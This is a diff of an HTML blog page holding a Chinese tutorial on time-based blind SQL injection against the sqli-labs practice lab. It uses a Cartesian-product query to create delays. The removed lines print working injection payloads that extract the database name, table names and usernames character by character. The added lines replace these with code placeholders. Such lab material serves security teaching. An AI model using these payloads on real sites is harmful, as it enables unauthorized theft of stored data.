@@ -174,18 +174,21 @@
     <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight" style="display: flex;">
         <div id="middle-box">
             <h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><p>原理：连接表是一个很耗时的操作（A×B&#x3D;A和B中每个元素的组合所组成的集合，就是连接表）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br></pre></td></tr></table></figure>
+<p>&lt;!–code￼0–&gt;
 
+</p>
 <p><strong>靶场实践</strong>（<code>sqli-9</code>）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(length((select database()))&gt;7,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure>
+<p>&lt;!–code￼1–&gt;
 
+</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242133119.png" alt="image-20250424213321067"></p>
 <p>页面延迟回显</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242133309.png" alt="image-20250424213359282"></p>
 <p>页面直接回显，说明书库名的长度为7.</p>
 <p>接下来查询数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(ascii(substr(database(),1,1))&gt;114,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure>
+<p>&lt;!–code￼2–&gt;
 
+</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134537.png" alt="image-20250424213424502"></p>
 <p>页面延迟回显</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134040.png" alt="image-20250424213441011"></p>
@@ -193,31 +196,35 @@
 <p>说明数据库名的第一个字符串对应的<code>ascii</code>码的值为115，则第一个字符串为‘s’。</p>
 <p>以此类推可以得到完整的数据库名为security。</p>
 <p>接下来查询第一个表名的长度</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure>
+<p>&lt;!–code￼3–&gt;
 
+</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134550.png" alt="image-20250424213458517"></p>
 <p>页面延迟回显</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135609.png" alt="image-20250424213513579"></p>
 <p>页面立刻出现回显，说明第一个表名的长度为6。</p>
 <p>接下来查询第一个表名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure>
+<p>&lt;!–code￼4–&gt;
 
+</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135425.png" alt="image-20250424213532389"></p>
 <p>页面延迟回显</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135042.png" alt="image-20250424213545009"></p>
 <p>页面立刻回显，说明表名的第一个字符对应的<code>ascii</code>码的值为101.</p>
 <p>更改<code>substr()</code>函数的参数可以得到完整的表名。</p>
 <p>依次类推，按照上面的方法可以得到列名以及列的内容，这里写一下具体的查询列的内容的查询语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(length((select username from users limit 0,1))&gt;3,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure>
+<p>&lt;!–code￼5–&gt;
 
+</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136928.png" alt="image-20250424213602897"></p>
 <p>页面延迟回显</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136397.png" alt="image-20250424213616364"></p>
 <p>页面立刻回显</p>
 <p>说明<code>username</code>列的第一个数据的长度是4</p>
 <p>接下来查询这个列中的第一个字符。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;67,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure>
+<p>&lt;!–code￼6–&gt;
 
+</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136590.png" alt="image-20250424213635556"></p>
 <p>页面延迟回显</p>
 <p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136928.png" alt="image-20250424213648892"></p>
